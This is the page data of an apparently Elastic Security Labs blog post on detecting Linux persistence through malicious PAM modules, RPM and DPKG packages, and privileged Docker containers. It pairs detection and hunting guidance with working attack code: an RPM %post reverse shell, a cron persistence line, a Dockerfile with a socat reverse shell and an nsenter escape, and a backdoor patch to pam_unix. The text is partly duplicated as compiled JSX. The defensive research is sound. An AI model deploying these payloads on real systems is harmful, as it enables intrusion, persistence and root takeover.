setup\nPACKAGE_NAME=\"panix\"\nPACKAGE_VERSION=\"1.0\"\ncat \u003c\u003c-EOF \u003e ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec\nName: ${PACKAGE_NAME}\nVersion: ${PACKAGE_VERSION}\nRelease: 1%{?dist}\nSummary: RPM package with payload script\nLicense: MIT\n\n%description\nRPM package with a payload script that executes a reverse shell.\n\n%prep\n# No need to perform any preparation actions\n\n%install\n# Create directories\nmkdir -p %{buildroot}/usr/bin\n\n%files\n# No need to specify any files here since the payload is embedded\n\n%post\n# Trigger payload after installation\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/${ip}/${port} 0\u003e\u00261' \u0026\n\n%clean\nrm -rf %{buildroot}\n\n%changelog\n* $(date +'%a %b %d %Y') John Doe \u003cjohn.doe@example.com\u003e 1.0-1\n- Initial package creation\n```\n\nNext, the `RPM` package is built using `rpmbuild`, and installed with `rpm`:\n\n```\n# Build RPM package\nrpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec\n\n# Install RPM package with forced overwrite\nVER=$(grep VERSION_ID /etc/os-release | cut -d '\"' -f 2 | cut -d '.' -f 1)\nrpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm\nmv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm\n```\n\nUpon installation, the payload will be executed. Again, the following `Cron` job is created to ensure persistence on a one-minute interval:\n\n`echo \"*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm \u003e /dev/null 2\u003e\u00261\" | crontab`\n\nLet’s examine the traces that the `RPM` package technique leaves behind:\n\n![PANIX malicious-package module execution visualized in Kibana (RPM)](/assets/images/approaching-the-summit-on-persistence/image5.png)\n\nUpon PANIX execution, the `panix.spec` file is created and populated. Next, `rpmbuild` is used to build the package, and `rpm -i` is executed to install the package. Upon installation, the `%post` payload is executed, leading to an execution of the reverse shell chain (`nohup` → `setsid` → `bash`) with a `process.parent.command_line` of `/bin/sh /var/tmp/rpm-tmp.HjtRV5 1`, indicating the execution of an `RPM` package. After installation, `Crontab` is altered to execute the payload once, at one minute intervals for consistency.   \nLet’s take a look at the coverage:\n\n*Detection and endpoint rules that cover installer package (DPKG \u0026 RPM) persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| Process | [RPM Package Installed by Unusual Parent Process](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_rpm_package_installation_from_unusual_parent.toml) [Unusual DPKG Execution](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_unusual_execution.toml) [DPKG Package Installed by Unusual Parent Process](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_package_installation_from_unusual_parent.toml) |\n| Network | [Egress Network Connection from Default DPKG Directory](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_default_dpkg_directory.toml) [Egress Network Connection from RPM Package](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_rpm_package.toml) |\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```\n\u003e ./panix.sh --revert malicious-package\n\n[+] Reverting malicious package...\n[+] Removing DPKG package 'panix'...\n[+] DPKG package 'panix' removed successfully.\n[+] Removing cron job associated with 'panix'...\n[+] Cron job removed.\n[+] Cleaning up '/var/lib/dpkg/info'...\n[+] Cleanup completed.\n```\n\n### Hunting for T1546.016 - Installer Packages: DPKG \u0026 RPM\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to package management tools. The approach includes monitoring for the following:\n\n* **File creation or modification in package management directories:** Tracks unusual changes to files in paths like `/var/lib/dpkg/info/` and `/var/lib/rpm/`, excluding common benign patterns such as checksum or list files.  \n* **Processes executed from lifecycle scripts:** Observes commands and processes launched from directories like `/var/tmp/rpm-tmp.*` and `/var/lib/dpkg/info/`, which may indicate suspicious or unauthorized activity.  \n* **Detailed metadata on modified files:** Uses OSQuery to gather additional file metadata, including ownership and timestamps, for forensic analysis of package management activity.\n\nBy combining the [Persistence via DPKG/RPM Package](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_rpm_dpkg_installer_packages.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1546.016](https://attack.mitre.org/techniques/T1546/016/).\n\n# T1610 - Deploy Container\n\nHost escape involves exploiting vulnerabilities, misconfigurations, or excessive permissions in containerized or virtualized environments to gain access to the underlying host system. Technologies like Docker, Kubernetes, and VMware aim to isolate workloads, but improper configurations or shared resources can allow attackers to break out of the container and compromise the host. MITRE tracks container deployment under identifier [T1610](https://attack.mitre.org/techniques/T1610/).\n\n## T1610 - Deploy Container: Malicious Docker Container\n\nDocker containers are particularly susceptible to host escapes when improperly secured. Attackers may exploit vulnerabilities or misconfigurations in two main ways:\n\n**1. Manipulating a Running Container**\n\nAttackers abuse misconfigured containers to execute commands affecting the host. Common scenarios include:\n\n* **Privileged Mode**: Containers running with `--privileged` can directly interact with host resources. For example, attackers may load kernel modules or access host-level devices.  \n* **Excessive Capabilities**: Containers with the `CAP_SYS_ADMIN` capability can perform privileged operations, such as mounting filesystems or accessing `/dev` devices.  \n* **Sensitive Volume Access**: Volumes like `/var/run/docker.sock` allow attackers to issue Docker commands to the host.  \n* **Host Namespace Access**: Containers configured with `--pid=host` or `--net=host` expose the host's process and network namespaces. Attackers can escalate privileges by targeting processes or manipulating network configurations directly.\n\n**2. Deploying a Malicious Container**\n\nAttackers deploy custom containers designed to break out of isolation. These containers often include:\n\n* Exploits targeting runtime vulnerabilities or kernel bugs.  \n* Scripts for privilege escalation or persistence, such as reverse shells or C2 beacons.  \n* Malicious configurations enabling unauthorized access to host resources.\n\nIn the next section, we will take a look at an example of a malicious docker container implementation.\n\n### Persistence through T1610 \\- Deploy Container: Malicious Docker Container\n\nIn this scenario, we will take a look at how to simulate the creation of an exemplary malicious Docker container through PANIX. Within the [setup\\_malicious\\_docker\\_container.sh](https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_docker_container.sh) module, PANIX creates a Dockerfile with the following contents:\n\n```\nFROM alpine:latest\n\nRUN apk add --no-cache bash socat sudo util-linux procps\n\nRUN adduser -D lowprivuser\n\nRUN echo '#!/bin/bash' \u003e /usr/local/bin/entrypoint.sh \\\\\n\t\u0026\u0026 echo 'while true; do /bin/bash -c \"socat exec:\\\"/bin/bash\\\",pty,stderr,setsid,sigint,sane tcp:$ip:$port\"; sleep 60; done' \u003e\u003e /usr/local/bin/entrypoint.sh \\\\\n\t\u0026\u0026 chmod +x /usr/local/bin/entrypoint.sh\n\nRUN echo '#!/bin/bash' \u003e /usr/local/bin/escape.sh \\\\\n\t\u0026\u0026 echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' \u003e\u003e /usr/local/bin/escape.sh \\\\\n\t\u0026\u0026 chmod +x /usr/local/bin/escape.sh \\\\\n\t\u0026\u0026 echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' \u003e\u003e /etc/sudoers\n\nUSER lowprivuser\n\nENTRYPOINT [\"/usr/local/bin/entrypoint.sh\"]\n```\n\nThe Dockerfile sets up a lightweight Alpine Linux container with tools like `bash`, `socat`, and `nsenter`. The `entrypoint.sh` script ensures continuous reverse shell access by repeatedly connecting to a remote server using `socat`. The `escape.sh` script, which is granted passwordless `sudo` permissions, uses `nsenter` to attach to the host's namespaces (e.g., mount, network, PID) via the init process, effectively breaking container isolation.\n\nThe container is built using:\n\n`docker build -t malicious-container -f $DOCKERFILE . \u0026\u0026 \\`\n\nWhere the `-t` flag tags the container for easy identification, and `-f` specifies the Dockerfile path.\n\nIt is then run with:\n\n`docker run -d --name malicious-container --privileged --pid=host malicious-container`\n\nWhere the `--privileged` flag allows full access to host resources, bypassing Docker’s isolation mechanisms, while `--pid=host` shares the host's process namespace, enabling the container to interact directly with host-level processes. \n\nTo test this technique, Docker must be installed, and the user running the simulation must either have root or docker group permissions. Let’s run the payload and examine the logs through the execution of the following PANIX command:\n\n```\nsudo ./panix.sh --malicious-container --ip 192.168.100.1 --port 2021\n\n =\u003e [1/5] FROM [installing ...]\n =\u003e [2/5] RUN apk add --no-cache bash socat sudo util-linux procps\n =\u003e [3/5] RUN adduser -D lowprivuser\n =\u003e [4/5] RUN echo '#!/bin/bash' \u003e /usr/local/bin/entrypoint.sh \u0026\u0026 echo 'while true; do /bin/bash -c \"socat exec:\n =\u003e [5/5] RUN echo '#!/bin/bash' \u003e /usr/local/bin/escape.sh \u0026\u0026 echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -'\n\n9543f7ce4c6a8defcad36358f00eb4d38a85a8688cc8ecd5f15a5a2d3f43383b\n\n[+] Malicious Docker container created and running.\n[+] Reverse shell is executed every minute.\n[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'.\n[+] Docker container persistence established!\n```\n\nAfter catching the shell on the attacker’s machine, run the `/usr/local/bin/escape.sh` script to escape the container:\n\n```\n❯ nc -nvlp 2021\nlistening on [any] 2021 ...\nconnect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 44726\n\n9543f7ce4c6a:/$ /usr/local/bin/escape.sh\nroot@debian10-persistence:~# hostname\ndebian10-persistence\n```\n\nUpon execution, the following logs are generated:\n\n![PANIX malicious-container module execution visualized in Kibana](/assets/images/approaching-the-summit-on-persistence/image6.png)\n\nThe execution of `panix.sh` initiates the creation of the `/tmp/Dockerfile`. The build command is then executed to create the container based on the specified configuration. Once built, the container is launched with the `--privileged` and `--pid=host` flags, enabling the necessary capabilities for host escape. Upon startup, the container runs the `/usr/local/bin/entrypoint.sh` script, which successfully establishes a reverse shell connection to the attacker’s machine using `socat`. After the shell is caught, the `/usr/local/bin/escape.sh` script is executed, effectively breaking out of the container and gaining access to the host.\n\nLet’s take a look at the coverage:\n\n*Detection and endpoint rules that cover malicious Docker container persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| Process | [Privileged Docker Container Creation](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_potentially_overly_permissive_container_creation.toml) [Docker Escape via Nsenter](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_escape_via_nsenter.toml) [Potential Chroot Container Escape via Mount](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_mount_chroot_container_escape.toml) [Potential Privilege Escalation via Container Misconfiguration](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_container_util_misconfiguration.toml) [Potential Privilege Escalation through Writable Docker Socket](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_writable_docker_socket.toml) |\n| Network | [Egress Connection from Entrypoint in Container](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_egress_connection_from_entrypoint_in_container.toml) |\n\nBesides the rules mentioned above, we also have a dedicated set of container rules that leverages our [Defend for Containers integration](https://www.elastic.co/guide/en/integrations/current/cloud_defend.html), which can be found in the [cloud\\_defend](https://github.com/elastic/detection-rules/tree/main/rules/integrations/cloud_defend) directory of our [detection-rules repository](https://github.com/elastic/detection-rules). We have also extended our protections through the integration of Falco with Elastic Security. This integration significantly enhances threat detection directly at the edge — whether in Docker containers, Kubernetes clusters, Linux virtual machines, or bare metal environments. By introducing dedicated Falco connectors, we've strengthened Elastic's capabilities to improve cloud workload protection and endpoint security strategies.\n\nFor a deeper dive into how our Falco integration secures container workloads, check out our recent blog, *“[Securing the Edge: Harnessing Falco’s Power with Elastic Security for Cloud Workload Protection](https://www.elastic.co/blog/falco-elastic-security-cloud-workload-protection)”*. The blog covers Falco setup, rule creation, alerting, and explores various threat scenarios.\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```\n\u003e ./panix.sh --revert malicious-container\n\n[+] Stopping and removing the 'malicious-container'...\n[+] Container 'malicious-container' stopped and removed.\n[+] Removing Docker image 'malicious-container'...\n[+] Docker image 'malicious-container' removed.\n[+] Removing Dockerfile at /tmp/Dockerfile...\n[+] Dockerfile removed.\n```\n\n### Hunting for T1610 - Deploy Container: Malicious Docker Container \n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious container activity and configurations. The approach includes monitoring for the following:\n\n* **Unusual network connections from Docker containers:** Tracks connections to external or non-local IP addresses initiated by processes under `/var/lib/docker/*`.  \n* **Privileged Docker containers:** Identifies containers running in privileged mode, which pose a higher risk of host compromise.  \n* **Recently created containers and images:** Observes Docker containers and images created or pulled within the last 7 days to detect unauthorized deployments or suspicious additions.  \n* **Sensitive host directory mounts:** Monitors container mounts accessing paths like `/var/run/docker.sock`, `/etc`, or the root directory (`/`), which could enable container escape or unauthorized host access.\n\nBy combining the [Persistence via Docker Container](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_malicious_docker_container.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1610](https://attack.mitre.org/techniques/T1610/).\n\n# Conclusion\n\nIn this fourth chapter of the \"Linux Detection Engineering\" series, we examined additional persistence techniques that adversaries may leverage on Linux systems. We explored the abuse of PAM modules and `pam_exec` for executing malicious code during authentication events. After PAM, we looked into installer package manipulation via `RPM` and `DPKG`, where lifecycle scripts are weaponized for persistence during the package installation/updating process. We finalized this part by examining malicious Docker containers, detailing how privileged containers and host-level access can be exploited for persistence and container escape.\n\nThese techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. By leveraging [PANIX](https://github.com/Aegrah/PANIX) to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided, you can build robust defenses and fine-tune your detection strategies.","code":"var Component=(()=\u003e{var h=Object.create;var r=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),b=(i,e)=\u003e{for(var t in e)r(i,t,{get:e[t],enumerable:!0})},a=(i,e,t,c)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of p(e))!m.call(i,o)\u0026\u0026o!==t\u0026\u0026r(i,o,{get:()=\u003ee[o],enumerable:!(c=u(e,o))||c.enumerable});return i};var w=(i,e,t)=\u003e(t=i!=null?h(g(i)):{},a(e||!i||!i.__esModule?r(t,\"default\",{value:i,enumerable:!0}):t,i)),y=i=\u003ea(r({},\"__esModule\",{value:!0}),i);var l=f((A,s)=\u003e{s.exports=_jsx_runtime});var x={};b(x,{default:()=\u003e_,frontmatter:()=\u003ek});var n=w(l()),k={title:\"Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms\",slug:\"approaching-the-summit-on-persistence\",date:\"2025-02-11\",description:\"Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.\",author:[{slug:\"ruben-groenewoud\"}],image:\"Security Labs Images 32.jpg\",category:[{slug:\"security-research\"}]};function d(i){let e=Object.assign({h1:\"h1\",p:\"p\",ul:\"ul\",li:\"li\",a:\"a\",em:\"em\",code:\"code\",h2:\"h2\",pre:\"pre\",h3:\"h3\",img:\"img\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",strong:\"strong\",br:\"br\"},i.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(e.h1,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,n.jsx)(e.p,{children:\"Welcome to part four of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.\"}),`\n`,(0,n.jsx)(e.p,{children:\"If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"Linux Detection Engineering - A Primer on Persistence Mechanisms\"})})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"Linux Detection Engineering - A Sequel on Persistence Mechanisms\"})})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"Linux Detection Engineering - A Continuation on Persistence Mechanisms\"})})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"In this publication, we\\u2019ll provide insights into:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"How each works (theory)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to set each up (practice)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to detect them (SIEM and Endpoint rules)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to hunt for them (ES|QL and OSQuery reference hunts)\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"To make the process even more engaging, we will be leveraging \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"By the end of this series, you'll have a robust knowledge of common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Let\\u2019s dive in!\"}),`\n`,(0,n.jsx)(e.h1,{id:\"setup-note\",children:\"Setup note\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules\",rel:\"nofollow\",children:\"enable and update our pre-built detection rules\"}),\". If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\"]}),`\n`,(0,n.jsx)(e.h1,{id:\"t1556003---modify-authentication-process-pluggable-authentication-modules\",children:\"T1556.003 - Modify Authentication Process: Pluggable Authentication Modules\"}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.a,{href:\"https://www.redhat.com/en/blog/pluggable-authentication-modules-pam\",rel:\"nofollow\",children:\"Pluggable Authentication Modules (PAM)\"}),\" are a powerful framework used in Linux to manage authentication-related tasks. PAM operates as a layer between applications and authentication methods, allowing system administrators to configure flexible and modular authentication policies. These modules are defined in configuration files typically found in \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"PAM modules themselves are shared library files commonly stored in the following locations:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/lib/security/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/lib64/security/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/lib/x86_64-linux-gnu/security/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/lib/security/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/lib64/security/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/lib/x86_64-linux-gnu/security/\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"These locations house modules that perform authentication tasks, such as validating passwords, managing accounts, or executing scripts during authentication. While PAM provides the essential capability to centralize how secure authentication happens, its flexibility can be abused by attackers to establish persistence through malicious PAM modules. By introducing custom modules or modifying existing configurations, attackers can manipulate authentication flows to capture credentials, manipulate logging to evade detection, grant unauthorized access, or execute malicious code.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This is a common technique, and some examples include the open-source \",(0,n.jsx)(e.a,{href:\"https://github.com/ldpreload/Medusa\",rel:\"nofollow\",children:\"Medusa\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://github.com/chokepoint/azazel\",rel:\"nofollow\",children:\"Azazel\"}),\" rootkits, and by malwares such as \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/software/S0377/\",rel:\"nofollow\",children:\"Ebury\"}),\", and \",(0,n.jsx)(e.a,{href:\"https://unit42.paloaltonetworks.com/linux-pam-apis/\",rel:\"nofollow\",children:\"Skidmap\"}),\" to establish persistence, capture credentials, and maintain unauthorized access. MITRE ATT\u0026CK tracks this technique under the identifier \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1556/003/\",rel:\"nofollow\",children:\"T1556.003\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1556003---pluggable-authentication-modules-malicious-pam\",children:\"T1556.003 - Pluggable Authentication Modules: Malicious PAM\"}),`\n`,(0,n.jsx)(e.p,{children:\"Malicious PAM modules are custom-built, malicious shared libraries designed to be loaded during the PAM authentication process. Although there are many different ways to establish a PAM backdoor, in this section we will showcase how PAM can be patched to allow for backdoor SSH access.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Commonly, PAM backdoors will patch the \",(0,n.jsx)(e.code,{children:\"pam_unix_auth.c\"}),\" file, which is part of the \",(0,n.jsx)(e.code,{children:\"pam_unix\"}),\" module, a widely used PAM module for UNIX-style password authentication. An open-source example of this is the \",(0,n.jsx)(e.a,{href:\"https://github.com/zephrax/linux-pam-backdoor\",rel:\"nofollow\",children:\"linux-pam-backdoor\"}),\" by \",(0,n.jsx)(e.a,{href:\"https://github.com/zephrax\",rel:\"nofollow\",children:\"zephrax\"}),\". The typical code that is run to verify the password of a user requesting authentication, looks as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-c\",children:`/* verify the password of this user */\nretval = _unix_verify_password(pamh, name, p, ctrl);\nname = p = NULL;\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The original code calls the \",(0,n.jsx)(e.code,{children:\"_unix_verify_password\"}),\" function to validate the provided password (\",(0,n.jsx)(e.code,{children:\"p\"}),\") against the stored password for the user (\",(0,n.jsx)(e.code,{children:\"name\"}),\"). The full source code is available \",(0,n.jsx)(e.a,{href:\"https://github.com/linux-pam/linux-pam/blob/fc927d8f1a6d81e5bcf58096871684b35b793fe2/modules/pam_unix/pam_unix_auth.c\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"A threat actor may patch this code, and introduce an additional check.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-c\",children:`/* verify the password of this user */\\vif (strcmp(p, \"_PASSWORD_\") != 0) {\\v    retval = _unix_verify_password(pamh, name, p, ctrl); \\v} else {\\v    retval = PAM_SUCCESS; \\v}\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"The code now checks:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"If the provided password (\",(0,n.jsx)(e.code,{children:\"p\"}),\") is not equal to the string literal \",(0,n.jsx)(e.code,{children:'\"_PASSWORD_\"'}),\", it proceeds to call \",(0,n.jsx)(e.code,{children:\"_unix_verify_password\"}),\" for standard password validation.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"If the password is \",(0,n.jsx)(e.code,{children:'\"_PASSWORD_\"'}),\", it skips the password verification entirely and directly returns \",(0,n.jsx)(e.code,{children:\"PAM_SUCCESS\"}),\", indicating successful authentication.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The patch introduces a hardcoded backdoor password. Any user who enters the password \",(0,n.jsx)(e.code,{children:'\"_PASSWORD_\"'}),\" will bypass normal password verification and be authenticated successfully, regardless of the actual password stored for the account.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"persistence-through-t1556003---pluggable-authentication-modules-malicious-pam\",children:\"Persistence through T1556.003 - Pluggable Authentication Modules: Malicious PAM\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"We will be leveraging the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh\",rel:\"nofollow\",children:\"setup_pam.sh\"}),\" module from PANIX to test this technique and research potential detection opportunities. This patch is easily implemented by downloading the PAM source code for the correct PAM version from the \",(0,n.jsx)(e.a,{href:\"https://github.com/linux-pam/linux-pam/releases\",rel:\"nofollow\",children:\"linux-pam\"}),\" GitHub repository, looking for the line to replace, and replacing it with your own hardcoded password:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`echo \"[+] Modifying PAM source...\"\nlocal target_file=\"$src_dir/modules/pam_unix/pam_unix_auth.c\"\nif grep -q \"retval = _unix_verify_password(pamh, name, p, ctrl);\" \"$target_file\"; then\n\tsed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\\\\\n\tif (p != NULL \u0026\u0026 strcmp(p, \"'$password'\") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' \"$target_file\"\n\techo \"[+] Source modified successfully.\"\nelse\n\techo \"[-] Target string not found in $target_file. Modification failed.\"\n\texit 1\nfi\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After which we can compile the shared object, and move it to the correct PAM directory.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Now let\\u2019s run the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh\",rel:\"nofollow\",children:\"setup_pam.sh\"}),\" module. This technique requires several compilation tools and downloading a specific Linux-PAM release. Execute the following PANIX command to inject a malicious module.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-py\",children:`\u003e sudo ./panix.sh --pam --module --password persistence\n\n[+] Determining PAM version...                                                                                          [+] Detected PAM Version: '1.3.1'                                                                                       [+] Downloading PAM source...                                                                                           [+] Download completed. Extracting...                                                                                   [+] Extraction completed.                                                                                               [+] Modifying PAM source...                                                                                             [+] Source modified successfully.                                                                                       [+] Compiling PAM source...                                                                                             [+] PAM compiled successfully.                                                                                          [+] Detecting PAM library directory...\n[+] Backing up original PAM library...                                                                                  [+] Copying PAM library to /lib/x86_64-linux-gnu/security...                                                            [+] Checking SELinux status...                                                                                          [+] Rogue PAM injected!                                                                                                                                                                                                                         \\v\nYou can now login to any user (including root) with a login shell using your specified password.\nExample: su - user                                                                                                      Example: ssh user@ip\n\n[+] PAM persistence established! \n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s analyze the events of interest in Discover. Due to the huge load of events originating from compiling PAM source, these events are sorted from oldest (top) to newest (bottom).\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image4.png\",alt:\"PANIX Malicious PAM module execution visualized in Kibana - part 1\",width:\"1672\",height:\"905\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon execution of PANIX, we can see \",(0,n.jsx)(e.code,{children:\"dpkg\"}),\" being used to discover the running PAM version, followed by a \",(0,n.jsx)(e.code,{children:\"curl\"}),\" execution to download the linux-pam source for this identified version. After extracting the \",(0,n.jsx)(e.code,{children:\"tar\"}),\" archive, PANIX continues to modify the \",(0,n.jsx)(e.code,{children:\"pam_unix_auth.c\"}),\" source code to implement the backdoor.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Once the above steps are completed, the following events occur (sorted from newest (top) to oldest (bottom)):\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image1.png\",alt:\"PANIX Malicious PAM module execution visualized in Kibana - part 2\",width:\"1492\",height:\"293\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"pam_unix.so\"}),\" file is compiled, and moved to the correct directory (in this case \",(0,n.jsx)(e.code,{children:\"/lib/x86_64-linux-gnu/security\"}),\"), overwriting the existing \",(0,n.jsx)(e.code,{children:\"pam_unix.so\"}),\" file and successfully activating the backdoor.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let's review the coverage:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover Malicious PAM 